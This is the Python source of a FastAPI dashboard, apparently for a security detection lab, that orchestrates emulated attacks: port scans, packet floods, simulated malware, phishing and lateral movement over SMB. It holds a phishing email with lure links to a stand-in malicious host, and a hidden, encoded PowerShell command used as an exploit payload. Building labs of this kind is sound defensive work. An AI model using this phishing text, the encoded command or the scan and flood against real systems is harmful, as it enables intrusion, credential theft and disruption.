import os
import time
import requests
import logging
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [DashboardC2] %(message)s")
logger = logging.getLogger("DashboardC2")

app = FastAPI(title="Lab Dashboard C2 - Orchestrator", version="2.0.0")

# Motor de plantillas (Jinja2)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

# Configuración de URLs y Direcciones de la Topología
ATTACKER_URL = os.getenv("ATTACKER_URL", "http://xdr-emu-attacker:5000")
WORKSTATION_URL = os.getenv("WORKSTATION_URL", "http://xdr-emu-workstation:5001")
WEB_SRV_IP = os.getenv("WEB_SRV_IP", "172.16.0.10")
MAIL_SRV_IP = os.getenv("MAIL_SRV_IP", "172.16.0.20")
DB_INTERNAL_IP = os.getenv("DB_INTERNAL_IP", "10.20.30.50")

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    """Renderiza el Lab Dashboard."""
    return templates.TemplateResponse(request=request, name="index.html")

# =========================================================================
# ENDPOINTS DE CONTROL (ORQUESTACIÓN DE TRÁFICO FÍSICO REAL EN CONTENEDORES)
# =========================================================================

@app.post("/api/normal/network")
def normal_network():
    """Ordena a la estación Workstation generar una transacción web legítima real."""
    logger.info(f"Orquestando tráfico normal en {WORKSTATION_URL}")
    try:
        res = requests.post(f"{WORKSTATION_URL}/traffic/generate-now", timeout=10.0)
        return {
            "status": "success",
            "message": "Tráfico web legítimo ejecutado físicamente en la red desde VENTAS-PC",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Workstation: {e}")
        return {"status": "error", "message": f"Error comunicando con Workstation ({WORKSTATION_URL}): {str(e)}"}

@app.post("/api/attack/network")
def attack_network():
    """Ordena al nodo Atacante ejecutar un escaneo TCP SYN y ráfagas de paquetes hacia la DMZ."""
    logger.info(f"Orquestando escaneo de red en {ATTACKER_URL} -> {WEB_SRV_IP}")
    try:
        # 1. Escaneo de puertos L4
        scan_payload = {"target_ip": WEB_SRV_IP, "ports": "80,445,25,5432"}
        res_scan = requests.post(f"{ATTACKER_URL}/attack/scan", json=scan_payload, timeout=20.0)
        
        # 2. Ráfaga de paquetes hacia el puerto 80
        flood_payload = {"target_ip": WEB_SRV_IP, "target_port": 80, "count": 40, "delay": 0.01}
        res_flood = requests.post(f"{ATTACKER_URL}/attack/flood", json=flood_payload, timeout=10.0)
        
        return {
            "status": "success",
            "message": "Tráfico L3/L4 real emitido físicamente desde 185.15.2.2 hacia la DMZ (172.16.0.10)",
            "details": {
                "scan": res_scan.json(),
                "flood": res_flood.json()
            }
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Atacante: {e}")
        return {"status": "error", "message": f"Error comunicando con Atacante ({ATTACKER_URL}): {str(e)}"}

@app.post("/api/attack/endpoint")
def attack_endpoint():
    """Ordena a la Workstation ejecutar en memoria una carga sospechosa y emitir Sysmon EventID 1."""
    logger.info(f"Orquestando telemetría de endpoint en {WORKSTATION_URL}")
    try:
        res = requests.post(f"{WORKSTATION_URL}/trigger-payload", timeout=10.0)
        return {
            "status": "success",
            "message": "Carga de malware simulada en VENTAS-PC. Telemetría Sysmon EventID 1 generada.",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Workstation: {e}")
        return {"status": "error", "message": f"Error comunicando con Workstation ({WORKSTATION_URL}): {str(e)}"}

@app.post("/api/attack/email")
def attack_email():
    """Ordena al Atacante enviar un correo malicioso real vía SMTP al puerto 25 del servidor de correo."""
    logger.info(f"Orquestando campaña de phishing en {ATTACKER_URL} -> {MAIL_SRV_IP}:25")
    try:
        phish_payload = {
            "target_ip": MAIL_SRV_IP,
            "target_port": 25,
            "recipient": "director@corp-mail.local",
            "sender": "alert@banking-security-update.com",
            "subject": "URGENTE: Cuenta corporativa bloqueada por actividad inusual",
            "body": "Por favor verifique sus credenciales inmediatamente en: http://secure-login-verify-account-update.com/login.php\nDescargue parche: http://malicious-cdn.xyz/patch.exe"
        }
        res = requests.post(f"{ATTACKER_URL}/attack/send-phishing", json=phish_payload, timeout=15.0)
        return {
            "status": "success",
            "message": f"Email malicioso transmitido por socket SMTP al puerto 25 de {MAIL_SRV_IP}",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Atacante para Phishing: {e}")
        return {"status": "error", "message": f"Error comunicando con Atacante ({ATTACKER_URL}): {str(e)}"}

@app.post("/api/attack/lateral")
def attack_lateral():
    """
    Orquesta un escenario real de Movimiento Lateral en 3 fases:
    1. Atacante (185.15.2.2) ataca y explota DMZ Web (172.16.0.10) vía HTTP real.
    2. Ejecución local en DMZ generando telemetría Sysmon en host.
    3. Conexión este-oeste hacia Servidor de Base de Datos (10.20.30.50) por SMB (puerto 445).
    """
    logger.info("Iniciando orquestación de Movimiento Lateral multi-etapa...")
    try:
        # Paso 1: Exploit Web real
        logger.info(f"Paso 1: Exploit HTTP de {ATTACKER_URL} a {WEB_SRV_IP}")
        exploit_payload = {
            "target_ip": WEB_SRV_IP,
            "cmd": "cmd.exe /c powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
        }
        res_step1 = requests.post(f"{ATTACKER_URL}/attack/web-exploit", json=exploit_payload, timeout=10.0)
        
        # Pequeña pausa táctica
        time.sleep(1.5)
        
        # Paso 2: Conexión Este-Oeste hacia la Base de Datos interna por SMB (puerto 445)
        logger.info(f"Paso 2: Conexión lateral hacia DB {DB_INTERNAL_IP}:445")
        lateral_payload = {
            "target_ip": DB_INTERNAL_IP,
            "target_port": 445
        }
        res_step2 = requests.post(f"{ATTACKER_URL}/attack/lateral-smb", json=lateral_payload, timeout=10.0)

        return {
            "status": "success",
            "message": "Escenario completo de Movimiento Lateral ejecutado físicamente en la red.",
            "details": {
                "step_1_web_exploit": res_step1.json(),
                "step_2_lateral_smb": res_step2.json()
            }
        }
    except Exception as e:
        logger.error(f"Fallo durante la orquestación de Movimiento Lateral: {e}")
        return {"status": "error", "message": f"Error en orquestación de Movimiento Lateral: {str(e)}"}
